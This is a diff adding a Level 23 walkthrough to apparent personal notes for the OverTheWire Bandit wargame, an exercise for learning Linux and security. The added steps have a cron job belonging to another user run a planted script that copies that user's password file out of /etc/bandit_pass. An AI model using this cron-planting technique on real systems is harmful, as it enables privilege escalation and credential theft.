@@ -58,4 +58,24 @@ cat /usr/bin/... .sh
 echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 #The output is the password 
 
+-------------------------LEVEL 23------------------------
+#Go to /tmp, create a directory for your exploit, and grant it full permissions:
+mkdir -p /tmp/my_exploit && chmod 777 /tmp/my_exploit
+cd /tmp/my_exploit
+#Create a script that reads the bandit24 password and saves it to a file you can access:
+-----------
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/my_exploit/pass.txt
+-----------
+#Set permissions
+chmod 777 script.sh
+touch pass.txt && chmod 777 pass.txt
 
+#Copy your script to the directory where the `cron` job executes files:
+cp script.sh /var/spool/bandit24/foo/
+
+#Retrieve the password
+Wait up to 60 seconds for the `cron` job to run, then check the output:
+cat pass.txt
+
+#The output is the password
